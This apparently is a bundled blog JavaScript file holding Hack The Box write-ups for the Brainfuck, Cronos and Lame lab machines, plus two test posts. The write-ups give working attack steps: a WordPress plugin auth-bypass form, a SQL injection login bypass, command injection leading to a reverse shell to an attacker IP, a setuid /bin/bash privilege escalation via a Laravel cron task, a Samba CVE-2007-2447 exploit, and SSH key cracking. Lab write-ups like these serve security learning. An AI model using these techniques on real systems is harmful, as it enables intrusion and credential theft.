attr-name\">type</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>text<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">name</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>username<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">value</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>admin<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>\n        <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>input</span> <span class=\"token attr-name\">type</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>hidden<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">name</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>email<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">value</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>orestis@brainfuck.htb<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>\n        <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>input</span> <span class=\"token attr-name\">type</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>hidden<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">name</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>action<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">value</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>loginGuestFacebook<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>\n        <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>input</span> <span class=\"token attr-name\">type</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>submit<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">value</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>Login<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>form</span><span class=\"token punctuation\">></span></span></code></pre><p>The file is hosted using the command below.</p>\n<pre class=\"language-bash\"><code class=\"language-bash\">python3 -m http.server 80</code></pre><p><img src=\"brainfuck.assets/image-20210424063117997.png\" alt=\"\"></p>\n<p>it is then viewed using a browser.</p>\n<p><img src=\"brainfuck.assets/image-20210424063217601.png\" alt=\"\"></p>\n<p><strong>Vulnerability Explanation:</strong></p>\n<p>When inspecting the traffic in Burpsuite, it can be concluded that the WP Support Plus plugin sets an authenticated cookie to the user without the need of a password.</p>\n<p><img src=\"brainfuck.assets/image-20210424064212334.png\" alt=\"\"></p>\n<p><img src=\"brainfuck.assets/image-20210424064603321.png\" alt=\"\"></p>\n<p>Once the script is ran, when refreshing the wordpress site, the cookies take effect and, the attacker is automatically authenticated.</p>\n<p><img src=\"brainfuck.assets/image-20210424064609386.png\" alt=\"\"></p>\n<h3 id=\"smtp-credentials-leaked\">SMTP Credentials leaked</h3>\n<p>Going to the <strong>Easy WP SMTP</strong> plugin, information about the user can be found.</p>\n<p><img src=\"brainfuck.assets/image-20210424065221953.png\" alt=\"\"></p>\n<p>In developers console, the password can be seen in cleartext.</p>\n<p><img src=\"brainfuck.assets/image-20210424065348596.png\" alt=\"\"></p>\n<pre class=\"language-html\"><code class=\"language-html\"><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>input</span> <span class=\"token attr-name\">type</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>password<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">name</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>swpsmtp_smtp_password<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">value</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>kHGuERB29DNiNE<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span></code></pre><p>SMTP Credential: </p>\n<p><strong>orestis:kHGuERB29DNiNE</strong></p>\n<h3 id=\"evolution-mail-client\">Evolution Mail Client</h3>\n<p>Evolution mail client is configured as shown below to see user orestis mails.</p>\n<p><img src=\"brainfuck.assets/image-20210424070158690.png\" alt=\"\"></p>\n<p><img src=\"brainfuck.assets/image-20210424070425913.png\" alt=\"\"></p>\n<p><img src=\"brainfuck.assets/image-20210424070431548.png\" alt=\"\"></p>\n<p><img src=\"brainfuck.assets/image-20210424070507569.png\" alt=\"\"></p>\n<p>After configuring evolution, user orestis mail can be viewed.</p>\n<p><img src=\"brainfuck.assets/image-20210424070539798.png\" alt=\"\"></p>\n<p>New credentials are revealed, it is for the forum found on the subdomain <strong>sup3rs3cr3t.brainfuck.htb</strong> </p>\n<p><img src=\"brainfuck.assets/image-20210424070838384.png\" alt=\"\"></p>\n<pre class=\"language-\"><code class=\"language-\">Hi there, your credentials for our \"secret\" forum are below :)\n\nusername: orestis\npassword: kIEnnfEKJ#9UmdO\n\nRegards</code></pre><h2 id=\"sup3rs3cr3tbrainfuckhtb-1\">sup3rs3cr3t.brainfuck.htb</h2>\n<p>Using the above credentials, the user orestic can now be accessed on the forum <strong>sup3rs3cr3t.brainfuck.htb</strong>.</p>\n<p>There are 3 topics listed in the forum:</p>\n<ul>\n<li>Key</li>\n<li>SSH Access</li>\n<li>Development</li>\n</ul>\n<p><img src=\"brainfuck.assets/image-20210424071528025.png\" alt=\"\"></p>\n<p>It can be observed that user orestis always signs with the phrase <em>Orestis - Hacking for fun and profit</em> on topic <strong>SSH Access</strong>.</p>\n<p><img src=\"brainfuck.assets/image-20210424072018596.png\" alt=\"\"></p>\n<p>However on topic <strong>Key</strong>, the page is encrypted. But the same pattern can be seen as orestis always signs his posts with the same phrase <em>Orestis - Hacking for fun and profit</em>.</p>\n<p><img src=\"brainfuck.assets/image-20210424072421469.png\" alt=\"\"> </p>\n<h3 id=\"decryption-of-the-posts\">Decryption of the posts</h3>\n<p>After researching the encryption method, it was concluded that it is a one time pad encryption technique also known as Vernam Cipher (One Time Pad Vigenere).</p>\n<p>Using the website <a target=\"_blank\" rel=\"nofollow\" href=\"https://www.boxentriq.com/code-breaking/one-time-pad\">https://www.boxentriq.com/code-breaking/one-time-pad</a>, the key was found to be <strong>BRAINFUCKMYBRAINFUCKMYBRAINFU</strong></p>\n<p><img src=\"brainfuck.assets/image-20210424073446093.png\" alt=\"\"></p>\n<p>The same result can be crossed check on the website <a target=\"_blank\" rel=\"nofollow\" href=\"https://www.dcode.fr/vernam-cipher-vigenere\">https://www.dcode.fr/vernam-cipher-vigenere</a></p>\n<p><img src=\"brainfuck.assets/image-20210424073724663.png\" alt=\"\"></p>\n<p>When decrypting what appeared to be a link <a target=\"_blank\" rel=\"nofollow\" href=\"mnvze://10.10.10.17/8zb5ra10m915218697q1h658wfoq0zc8/frmfycu/sp_ptr\">mnvze://10.10.10.17/8zb5ra10m915218697q1h658wfoq0zc8/frmfycu/sp_ptr</a> with the pad <strong>FUCKMYBRAINFUCKMYBRAINFUCKMYBR</strong>, it resulted to reveal a link to the user orestis ssh public key <a target=\"_blank\" rel=\"nofollow\" href=\"https://10.10.10.17/8ba5aa10e915218697d1c658cdee0bb8/orestis/id_rsa\">https://10.10.10.17/8ba5aa10e915218697d1c658cdee0bb8/orestis/id_rsa</a></p>\n<p><img src=\"brainfuck.assets/image-20210424074619202.png\" alt=\"\"></p>\n<pre class=\"language-bash\"><code class=\"language-bash\">curl -sk https://10.10.10.17/8ba5aa10e915218697d1c658cdee0bb8/orestis/id_rsa -o orestis.enc \ncat orestis.enc </code></pre><p>The ssh key is an encrypted key and it needs to be decrypted in order to ssh as the orestis user.</p>\n<p><img src=\"brainfuck.assets/image-20210424081016859.png\" alt=\"\"></p>\n<pre class=\"language-\"><code class=\"language-\">-----BEGIN RSA PRIVATE KEY-----\nProc-Type: 4,ENCRYPTED\nDEK-Info: AES-128-CBC,6904FEF19397786F75BE2D7762AE7382\n\nmneag/YCY8AB+OLdrgtyKqnrdTHwmpWGTNW9pfhHsNz8CfGdAxgchUaHeoTj/rh/\nB2nS4+9CYBK8IR3Vt5Fo7PoWBCjAAwWYlx+cK0w1DXqa3A+BLlsSI0Kws9jea6Gi\nW1ma/V7WoJJ+V4JNI7ufThQyOEUO76PlYNRM9UEF8MANQmJK37Md9Ezu53wJpUqZ\n7dKcg6AM/o9VhOlpiX7SINT9dRKaKevOjopRbyEFMliP01H7ZlahWPdRRmfCXSmQ\nzxH9I2lGIQTtRRA3rFktLpNedNPuZQCSswUec7eVVt2mc2Zv9PM9lCTJuRSzzVum\noz3XEnhaGmP1jmMoVBWiD+2RrnL6wnz9kssV+tgCV0mD97WS+1ydWEPeCph06Mem\ndLR2L1uvBGJev8i9hP3thp1owvM8HgidyfMC2vOBvXbcAA3bDKvR4jsz2obf5AF+\nFvt6pmMuix8hbipP112Us54yTv/hyC+M5g1hWUuj5y4xovgr0LLfI2pGe+Fv5lXT\nmcznc1ZqDY5lrlmWzTvsW7h7rm9LKgEiHn9gGgqiOlRKn5FUl+DlfaAMHWiYUKYs\nLSMVvDI6w88gZb102KD2k4NV0P6OdXICJAMEa1mSOk/LS/mLO4e0N3wEX+NtgVbq\nul9guSlobasIX5DkAcY+ER3j+/YefpyEnYs+/tfTT1oM+BR3TVSlJcOrvNmrIy59\nkrKVtulxAejVQzxImWOUDYC947TXu9BAsh0MLoKtpIRL3Hcbu+vi9L5nn5LkhO/V\ngdMyOyATor7Amu2xb93OO55XKkB1liw2rlWg6sBpXM1WUgoMQW50Keo6O0jzeGfA\nVwmM72XbaugmhKW25q/46/yL4VMKuDyHL5Hc+Ov5v3bQ908p+Urf04dpvj9SjBzn\nschqozogcC1UfJcCm6cl+967GFBa3rD5YDp3x2xyIV9SQdwGvH0ZIcp0dKKkMVZt\nUX8hTqv1ROR4Ck8G1zM6Wc4QqH6DUqGi3tr7nYwy7wx1JJ6WRhpyWdL+su8f96Kn\nF7gwZLtVP87d8R3uAERZnxFO9MuOZU2+PEnDXdSCSMv3qX9FvPYY3OPKbsxiAy+M\nwZezLNip80XmcVJwGUYsdn+iB/UPMddX12J30YUbtw/R34TQiRFUhWLTFrmOaLab\nIql5L+0JEbeZ9O56DaXFqP3gXhMx8xBKUQax2exoTreoxCI57axBQBqThEg/HTCy\nIQPmHW36mxtc+IlMDExdLHWD7mnNuIdShiAR6bXYYSM3E725fzLE1MFu45VkHDiF\nmxy9EVQ+v49kg4yFwUNPPbsOppKc7gJWpS1Y/i+rDKg8ZNV3TIb5TAqIqQRgZqpP\nCvfPRpmLURQnvly89XX97JGJRSGJhbACqUMZnfwFpxZ8aPsVwsoXRyuub43a7GtF\n9DiyCbhGuF2zYcmKjR5EOOT7HsgqQIcAOMIW55q2FJpqH1+PU8eIfFzkhUY0qoGS\nEBFkZuCPyujYOTyvQZewyd+ax73HOI7ZHoy8CxDkjSbIXyALyAa7Ip3agdtOPnmi\n6hD+jxvbpxFg8igdtZlh9PsfIgkNZK8RqnPymAPCyvRm8c7vZFH4SwQgD5FXTwGQ\n-----END RSA PRIVATE KEY-----</code></pre><p>The password is cracked using john.</p>\n<pre class=\"language-powershell\"><code class=\"language-powershell\"># cracked on windows\npython ./run/ssh2john.py ./hashes/brainfuck-orestis.enc.txt | Out-File ./hashes/brainfuck-orestis.txt\n\n# if having error: Error: UTF-16 BOM seen in input file.\n# open ./hashes/brainfuck-orestis.txt in sublime and save with encoding utf-8\n\n./run/john.exe --wordlist=\"D:/Documents/Bug Bounty/SecLists/Passwords/Leaked-Databases/rockyou.txt\" ./hashes/brainfuck-orestis.txt</code></pre><p><img src=\"brainfuck.assets/image-20210424083739076.png\" alt=\"\"></p>\n<pre class=\"language-\"><code class=\"language-\">3poulakia!       (.\\hashes\\brainfuck-orestis.enc.txt)</code></pre><p>SSH credential:</p>\n<p><strong>orestis:3poulakia!</strong></p>\n<h3 id=\"ssh-as-orestis\">SSH as orestis</h3>\n<p>Using the password <strong>3poulakia!</strong>, brainfuck.htb can be access as the user orestis.</p>\n<pre class=\"language-bash\"><code class=\"language-bash\">chmod 600 orestis.enc \nssh -i orestis.enc orestis@brainfuck.htb </code></pre><p><img src=\"brainfuck.assets/image-20210424084309613.png\" alt=\"\"></p>\n<h3 id=\"usertxt\">User.txt</h3>\n<p>User.txt can be found in the home directory of orestis.</p>\n<p><img src=\"brainfuck.assets/image-20210424084553996.png\" alt=\"\"></p>\n<blockquote>\n<p>user.txt: 2c11cfbc5b959f73ac15a3310bd097c9</p>\n</blockquote>\n<h3 id=\"roottxt\">Root.txt</h3>\n<p>There are some uncommon files which are only readable by orestis</p>\n<ul>\n<li>encrypt.sage</li>\n<li>debug.txt</li>\n<li>output.txt </li>\n</ul>\n<p><img src=\"brainfuck.assets/image-20210424084857346.png\" alt=\"\"></p>\n<p>The file <strong>encrypt.sage</strong> is a python script which looks to be doing an RSA cipher on /root/root.txt</p>\n<p><img src=\"brainfuck.assets/image-20210424085249183.png\" alt=\"\"> </p>\n<p><strong>encrypt.sage</strong>:</p>\n<pre class=\"language-python\"><code class=\"language-python\">nbits = 1024\n\npassword = open(\"/root/root.txt\").read().strip()\nenc_pass = open(\"output.txt\",\"w\")\ndebug = open(\"debug.txt\",\"w\")\nm = Integer(int(password.encode('hex'),16))\n\np = random_prime(2^floor(nbits/2)-1, lbound=2^floor(nbits/2-1), proof=False)\nq = random_prime(2^floor(nbits/2)-1, lbound=2^floor(nbits/2-1), proof=False)\nn = p*q\nphi = (p-1)*(q-1)\ne = ZZ.random_element(phi)\nwhile gcd(e, phi) != 1:\n    e = ZZ.random_element(phi)\n\n\n\nc = pow(m, e, n)\nenc_pass.write('Encrypted Password: '+str(c)+'\\n')\ndebug.write(str(p)+'\\n')\ndebug.write(str(q)+'\\n')\ndebug.write(str(e)+'\\n')</code></pre><p><strong>output.txt</strong> contains <strong>c</strong>, and <strong>debug.txt</strong> contains <strong>p</strong>,<strong>q</strong> and <strong>e</strong> respectively.</p>\n<p><img src=\"brainfuck.assets/image-20210424105245632.png\" alt=\"\"></p>\n<p>The content of <strong>/root/root.txt</strong> can be easily decrypted given all the above information.</p>\n<p>Using the website <a target=\"_blank\" rel=\"nofollow\" href=\"https://www.dcode.fr/rsa-cipher\">https://www.dcode.fr/rsa-cipher</a>, the original content of <strong>/root/root.txt</strong> can be obtained.</p>\n<p><img src=\"brainfuck.assets/image-20210424090253551.png\" alt=\"\"></p>\n<blockquote>\n<p>root.txt: 6efc1a5dbb8904751ce6566a305bb8ef</p>\n</blockquote>\n","date":"2021-04-24","excerpt":"","printDate":"April 24, 2021","printReadingTime":"5 min read"};

var route_5 = /*#__PURE__*/Object.freeze({
  __proto__: null,
  'default': Mod2
});

var Mod3 = {"title":"HTB - Cronos","slug":"Cronos","html":"<h1 id=\"cronos---10101013\">Cronos - 10.10.10.13</h1>\n<h1 id=\"enumeration\">Enumeration</h1>\n<h2 id=\"nmap\">Nmap</h2>\n<pre class=\"language-bash\"><code class=\"language-bash\">nmap -sC -sV -oA nmap/initial 10.10.10.13</code></pre><pre class=\"language-bash\"><code class=\"language-bash\"># Nmap 7.91 scan initiated Thu Apr 29 13:00:15 2021 as: nmap -sC -sV -T4 -oA nmap/initial 10.10.10.13\nNmap scan report for 10.10.10.13\nHost is up (0.24s latency).\nNot shown: 997 filtered ports\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   2048 18:b9:73:82:6f:26:c7:78:8f:1b:39:88:d8:02:ce:e8 (RSA)\n|   256 1a:e6:06:a6:05:0b:bb:41:92:b0:28:bf:7f:e5:96:3b (ECDSA)\n|_  256 1a:0e:e7:ba:00:cc:02:01:04:cd:a3:a9:3f:5e:22:20 (ED25519)\n53/tcp open  domain  ISC BIND 9.10.3-P4 (Ubuntu Linux)\n| dns-nsid: \n|_  bind.version: 9.10.3-P4-Ubuntu\n80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))\n|_http-server-header: Apache/2.4.18 (Ubuntu)\n|_http-title: Apache2 Ubuntu Default Page: It works\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\n# Nmap done at Thu Apr 29 13:00:45 2021 -- 1 IP address (1 host up) scanned in 30.63 seconds</code></pre><h2 id=\"website\">Website</h2>\n<p>Going to the <a target=\"_blank\" rel=\"nofollow\" href=\"http://10.10.10.13\">http://10.10.10.13</a>, it is a default apache webpage.</p>\n<p><img src=\"Cronos.assets/image-20210429134408046.png\" alt=\"\"></p>\n<h2 id=\"dns-enumeration\">DNS Enumeration</h2>\n<p>Since port 53 is open and dns is setup, the machine could have some virtual host routing setup.</p>\n<pre class=\"language-bash\"><code class=\"language-bash\">$ nslookup\n# the server is setup, this will define where the queries are sent\n> server 10.10.10.13 \nDefault server: 10.10.10.13\nAddress: 10.10.10.13#53\n# the server is told to query itself on localhost\n> 127.0.0.1\n1.0.0.127.in-addr.arpa  name = localhost.\n# the server is told to query the public ip address\n> 10.10.10.13\n13.10.10.10.in-addr.arpa        name = ns1.cronos.htb.</code></pre><p>A dns entry is revealed with a subdomain.</p>\n<pre class=\"language-bash\"><code class=\"language-bash\">$ dig axfr cronos.htb @10.10.10.13 \n\n; &lt;&lt;>> DiG 9.16.13-Debian &lt;&lt;>> axfr cronos.htb @10.10.10.13\n;; global options: +cmd\ncronos.htb.             604800  IN      SOA     cronos.htb. admin.cronos.htb. 3 604800 86400 2419200 604800\ncronos.htb.             604800  IN      NS      ns1.cronos.htb.\ncronos.htb.             604800  IN      A       10.10.10.13\nadmin.cronos.htb.       604800  IN      A       10.10.10.13\nns1.cronos.htb.         604800  IN      A       10.10.10.13\nwww.cronos.htb.         604800  IN      A       10.10.10.13\ncronos.htb.             604800  IN      SOA     cronos.htb. admin.cronos.htb. 3 604800 86400 2419200 604800\n;; Query time: 788 msec\n;; SERVER: 10.10.10.13#53(10.10.10.13)\n;; WHEN: Thu Apr 29 13:53:24 EDT 2021\n;; XFR size: 7 records (messages 1, bytes 203)</code></pre><p>Several domains are revealed when looking for dns zone transfers</p>\n<ul>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"\">cronos.htb</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"\">www.cronos.htb</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"\">admin.cronos.htb</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"\">ns1.cronos.htb</a></li>\n</ul>\n<p>The above domains are added to the <strong>/etc/hosts</strong> file.</p>\n<p><strong>ns1.cronos.htb</strong></p>\n<p><img src=\"Cronos.assets/image-20210429141923272.png\" alt=\"\"></p>\n<p><strong><a target=\"_blank\" rel=\"nofollow\" href=\"http://www.cronos.htb\">www.cronos.htb</a></strong>, <strong>cronos.htb</strong></p>\n<p><img src=\"Cronos.assets/image-20210429141623055.png\" alt=\"\"></p>\n<p>admin.cronos.htb</p>\n<p><img src=\"Cronos.assets/image-20210429142110168.png\" alt=\"\"></p>\n<p>After trying basic SQl injection <code>admin&#39; or 1=1 -- -</code> in the login page, the attacker can bypass the login.</p>\n<p><img src=\"Cronos.assets/image-20210429142346516.png\" alt=\"\"></p>\n<p>The attacker can execute code when trying command injection payload <code>;ls</code> in the input field.</p>\n<p><img src=\"Cronos.assets/image-20210429142725304.png\" alt=\"\"></p>\n<h1 id=\"exploitation\">Exploitation</h1>\n<h3 id=\"getting-a-reverse-shell\">Getting a reverse shell</h3>\n<p>Intercepting the post request on burp, commands can be easily executed on the server. </p>\n<p><img src=\"Cronos.assets/image-20210429145546248.png\" alt=\"\"></p>\n<p>The tools used here to generate quick  reverse shell is called <a target=\"_blank\" rel=\"nofollow\" href=\"https://github.com/mthbernardes/rsg\">rsg or reverse shell generator</a></p>\n<pre class=\"language-bash\"><code class=\"language-bash\"># generates payload and as well as listens on the specified port\nrsg 10.10.14.23 8888 bash</code></pre><p>The attacker then uploads the shell.php and sets up <strong>nc</strong> to listen for an incoming connection on port <strong>8888</strong>.</p>\n<p>The command is first url encoded before sending it to the server.</p>\n<p><img src=\"Cronos.assets/image-20210429150112820.png\" alt=\"\"></p>\n<p>The reverse shell is then stabilised using the following commands.</p>\n<pre class=\"language-bash\"><code class=\"language-bash\">which python3 # to know which python version exists\npython3 -c 'import pty;pty.spawn(\"/bin/bash\")' # gets a proper tty shell\n# the shell is then backgrounded using ctrl+z\nstty raw -echo # this is executed on the attackers machine\n# then press fg to resume the tty shell\nexport TERM=xterm # after setting the terminal type, the screen can now be cleared\nstty rows 42 cols 172 # sets the size for the tty shell</code></pre><h1 id=\"post-exploitation\">Post Exploitation</h1>\n<h2 id=\"privilege-escalation-to-root\">Privilege Escalation to Root</h2>\n<p>After running LinEnum.sh from <a target=\"_blank\" rel=\"nofollow\" href=\"https://github.com/rebootuser/LinEnum\">https://github.com/rebootuser/LinEnum</a>, it is known that a cronjob is running on the server.</p>\n<p><img src=\"Cronos.assets/image-20210429153151953.png\" alt=\"\"></p>\n<h3 id=\"vulnerability-explanation\"><strong>Vulnerability Explanation:</strong></h3>\n<p>Since the cronjob is ran as root, if the attacker can control a schedule task, it will be ran with root privileges. Upon researching, the file <strong>/var/www/laravel/app/Console/Kernel.php</strong> needs to edited to add a task.</p>\n<pre class=\"language-bash\"><code class=\"language-bash\">find / -name \"Kernel.php\" -ls 2>/dev/null</code></pre><p>The file is owned by the user <strong>www-data</strong> and the current shell is as that specific user. Hence the attacker can modify the file as needed.</p>\n<p><img src=\"Cronos.assets/image-20210429153956388.png\" alt=\"\"></p>\n<p>source: <a target=\"_blank\" rel=\"nofollow\" href=\"https://tutsforweb.com/how-to-set-up-task-scheduling-cron-job-in-laravel/\">https://tutsforweb.com/how-to-set-up-task-scheduling-cron-job-in-laravel/</a></p>\n<p><img src=\"Cronos.assets/image-20210429153632588.png\" alt=\"\"></p>\n<p>source: <a target=\"_blank\" rel=\"nofollow\" href=\"https://vegibit.com/scheduling-commands-and-tasks-in-laravel/\">https://vegibit.com/scheduling-commands-and-tasks-in-laravel/</a></p>\n<p><img src=\"Cronos.assets/image-20210429154116336.png\" alt=\"\"></p>\n<pre class=\"language-php\"><code class=\"language-php\">    protected function schedule(Schedule $schedule)\n    {\n        // $schedule->command('inspire')\n        //          ->hourly();\n        $schedule->exec('chmod u+s /bin/bash')->everyMinute();\n    }</code></pre><p>After the setuid of <strong>/bin/bash</strong> when executing <code>bash -p</code>, the attacker can have the shell of the current user have an effective user ID or euid of root.</p>\n<p><img src=\"Cronos.assets/image-20210429161104987.png\" alt=\"\"></p>\n<h3 id=\"usertxt\">User.txt</h3>\n<pre class=\"language-bash\"><code class=\"language-bash\">find /home -type f -ls 2>/dev/null | grep user</code></pre><p><strong>User.txt</strong> can be found in the home directory of <strong>noulis</strong>.</p>\n<pre class=\"language-bash\"><code class=\"language-bash\">cat /home/noulis/user.txt</code></pre><p><img src=\"Cronos.assets/image-20210429161454130.png\" alt=\"\"></p>\n<blockquote>\n<p>user.txt flag: <code>51d236438b333970dbba7dc3089be33b</code></p>\n</blockquote>\n<h3 id=\"roottxt\">Root.txt</h3>\n<p>the <strong>root.txt</strong> file is always located in <strong>/root/</strong></p>\n<pre class=\"language-bash\"><code class=\"language-bash\">cat /root/root.txt</code></pre><p><img src=\"Cronos.assets/image-20210429161557939.png\" alt=\"\"></p>\n<blockquote>\n<p>root.txt flag: <code>1703b8a3c9a8dde879942c79d02fd3a0</code></p>\n</blockquote>\n","date":"2021-04-29","excerpt":"","printDate":"April 29, 2021","printReadingTime":"4 min read"};

var route_10 = /*#__PURE__*/Object.freeze({
  __proto__: null,
  'default': Mod3
});

var Mod4 = {"title":"First Post Test","slug":"first-post-test","html":"<p>Testing Typora features. </p>\n<h1 id=\"hello\">hello</h1>\n<h2 id=\"hello-1\">hello</h2>\n<h3 id=\"hello-2\">hello</h3>\n<h4 id=\"hello-3\">hello</h4>\n<p>normal test</p>\n<p>picture test </p>\n<img src=\"first-post-test.assets/image-20201204114358026.png\" alt=\"not so \" style=\"zoom:50%;\" />\n\n<p>testing picture with different sizes</p>\n<img src=\"first-post-test.assets/image-20201204114507428.png\" alt=\"image-20201204114507428\" style=\"zoom:50%;\" />\n\n\n\n<p>another one</p>\n<p><img src=\"first-post-test.assets/image-20201204114537968.png\" alt=\"big\"></p>\n<p><img src=\"first-post-test.assets/image-20201204120909906.png\" alt=\"image-20201204120909906\"></p>\n","date":"2021-01-06","excerpt":"\nThis is a test post to check if Typora is well integrated with the workflow.\n\n","printDate":"January 6, 2021","printReadingTime":"1 min read"};

var route_1 = /*#__PURE__*/Object.freeze({
  __proto__: null,
  'default': Mod4
});

var Mod5 = {"title":"Hello World 👋","slug":"hello-world","html":"<p>This post intentionally left blank.</p>\n<p>Write what you want.</p>\n","date":"2021-01-02","excerpt":"\nEvery blog starts with a single post. This is yours. Make it great.\n\n","printDate":"January 2, 2021","printReadingTime":"1 min read"};

var route_3 = /*#__PURE__*/Object.freeze({
  __proto__: null,
  'default': Mod5
});

var Mod6 = {"title":"HTB - Lame","slug":"Lame","html":"<h1 id=\"lame---1010103\">Lame - 10.10.10.3</h1>\n<h2 id=\"enumeration\">Enumeration</h2>\n<h3 id=\"nmap\">Nmap</h3>\n<p>command: </p>\n<pre class=\"language-bash\"><code class=\"language-bash\">nmap -p- -Pn 10.10.10.3 -oA nmap/quick</code></pre><pre class=\"language-bash\"><code class=\"language-bash\">Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.\nStarting Nmap 7.91 ( https://nmap.org ) at 2021-04-23 04:56 EDT\nVerbosity Increased to 1.\nConnect Scan Timing: About 64.81% done; ETC: 05:04 (0:02:45 remaining)\nDiscovered open port 3632/tcp on 10.10.10.3\nVerbosity Decreased to 0.\nNmap scan report for 10.10.10.3\nHost is up (0.24s latency).\nNot shown: 65530 filtered ports\nPORT     STATE SERVICE\n21/tcp   open  ftp\n22/tcp   open  ssh\n139/tcp  open  netbios-ssn\n445/tcp  open  microsoft-ds\n3632/tcp open  distccd\n\nNmap done: 1 IP address (1 host up) scanned in 447.44 seconds</code></pre><h2 id=\"vulnerability-information\">Vulnerability Information</h2>\n<p>Searchsploit is used to search for a known exploit the samba version <strong>3.0.20</strong></p>\n<p>command: </p>\n<pre class=\"language-bash\"><code class=\"language-bash\">searchsploit samba 3.0.20</code></pre><p><img src=\"Lame.assets/image-20210423035311257.png\" alt=\"\"></p>\n<p><img src=\"Lame.assets/image-20210423030333503.png\" alt=\"\"></p>\n<p>After researching the exploit <strong>Samba 3.0.20 &lt; 3.0.25rc3 - &#39;Username&#39; map script&#39; Command Execution</strong> , its CVE can be found on exploitdb website. </p>\n<p><a target=\"_blank\" rel=\"nofollow\" href=\"https://www.exploit-db.com/exploits/16320\">Link</a>:  <a target=\"_blank\" rel=\"nofollow\" href=\"https://www.exploit-db.com/exploits/16320\">https://www.exploit-db.com/exploits/16320</a> CVE: 2007-2447</p>\n<p><img src=\"Lame.assets/image-20210423040537738.png\" alt=\"\"></p>\n<p>Upon searching for the CVE in <a target=\"_blank\" rel=\"nofollow\" href=\"https://nvd.nist.gov/\">National Vulnerability Database</a>, it can be known on how does the payload work. </p>\n<p><a target=\"_blank\" rel=\"nofollow\" href=\"https://nvd.nist.gov/vuln/detail/CVE-2007-2447\">Link</a>: <a target=\"_blank\" rel=\"nofollow\" href=\"https://nvd.nist.gov/vuln/detail/CVE-2007-2447\">https://nvd.nist.gov/vuln/detail/CVE-2007-2447</a></p>\n<p><img src=\"Lame.assets/image-20210423041046805.png\" alt=\"\"></p>\n<p><strong>Vulnerability Explanation:</strong></p>\n<p>The MS-RPC functionality in smbd in Samba 3.0.0 through 3.0.25rc3 allows remote attackers to execute arbitrary commands via shell metacharacters involving the (1) SamrChangePassword function, when the &quot;username map  script&quot; smb.conf option is enabled, and allows remote authenticated  users to execute commands via shell metacharacters involving other  MS-RPC functions in the (2) remote printer and (3) file share  management.</p>\n<h2 id=\"exploitation\">Exploitation</h2>\n<p>When searching for <strong>cve-2007-2447 exploit</strong> on google, a github repository is found containing a python POC script.</p>\n<p><img src=\"Lame.assets/image-20210423050552798.png\" alt=\"\"> </p>\n<p><a target=\"_blank\" rel=\"nofollow\" href=\"https://nvd.nist.gov/vuln/detail/CVE-2007-2447\">Link</a>: <a target=\"_blank\" rel=\"nofollow\" href=\"https://github.com/amriunix/CVE-2007-2447\">https://github.com/amriunix/CVE-2007-2447</a></p>\n<p><img src=\"Lame.assets/image-20210423050643210.png\" alt=\"\"></p>\n<p>A python package needs to be installed to run the script.</p>\n<p>command:</p>\n<pre class=\"language-bash\"><code class=\"language-bash\">mkdir exploit\ncd exploit\ngit clone https://github.com/amriunix/CVE-2007-2447\npip install --user pysmb</code></pre><p><img src=\"Lame.assets/image-20210423050855031.png\" alt=\"\"></p>\n<p>After installing the exploit dependencies, the python exploit can now be ran.</p>\n<p>command:</p>\n<pre class=\"language-bash\"><code class=\"language-bash\">python3 usermap_script.py 10.10.10.3 139 10.10.14.3 8888\nrlwrap nc -lvnp 